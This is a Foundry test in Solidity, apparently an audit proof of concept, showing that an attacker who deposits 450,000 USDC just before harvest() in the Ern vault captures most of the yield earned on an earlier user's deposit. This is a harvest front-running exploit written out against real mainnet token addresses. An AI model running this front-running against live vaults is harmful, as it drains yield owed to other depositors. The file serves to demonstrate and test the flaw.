// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "../src/Ern.sol";

contract ErnTest is Test {
    address alice = address(1);
    address attacker = address(2);

    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    Ern vault;

    uint256 constant ALICE_DEPOSIT = 50_000e6;      // 50,000 USDC
    uint256 constant ATTACKER_DEPOSIT = 450_000e6;  // 450,000 USDC

    function setUp() public {
        vault = new Ern(
            ERC20(address(USDC)),
            ERC20(address(WBTC)),
            IAaveAddressesProvider(0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e),
            IDex(0xE592427A0AEce92De3Edee1F18E0157C05861564)
        );

        deal(address(USDC), alice, ALICE_DEPOSIT);
        deal(address(USDC), attacker, ATTACKER_DEPOSIT);

        vm.startPrank(alice);
        USDC.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(attacker);
        USDC.approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }

    function testHarvestFrontRun() public {
        // 1. Alice deposits 50,000 USDC
        vm.prank(alice);
        vault.deposit(ALICE_DEPOSIT);

        // 2. Simulate yield accrual: 500 USDC (1% of TVL)
        //    Directly set the vault's aToken balance to simulate Aave yield
        deal(address(USDC), address(vault), 500e6);

        // 3. Attacker front-runs harvest by depositing 450,000 USDC
        vm.prank(attacker);
        vault.deposit(ATTACKER_DEPOSIT);

        // 4. Warp time to satisfy harvest conditions (if any)
        vm.warp(block.timestamp + 1 days);

        // 5. Harvest is executed (attacker's shares are now included)
        vault.harvest(0);

        // 6. Check claimable rewards for both users
        uint256 aliceReward = vault.claimableYield(alice);
        uint256 attackerReward = vault.claimableYield(attacker);

        emit log_named_uint("Alice reward", aliceReward);
        emit log_named_uint("Attacker reward", attackerReward);

        // Assert that attacker captured a disproportionate share of the yield
        assertTrue(attackerReward > aliceReward);
    }
}
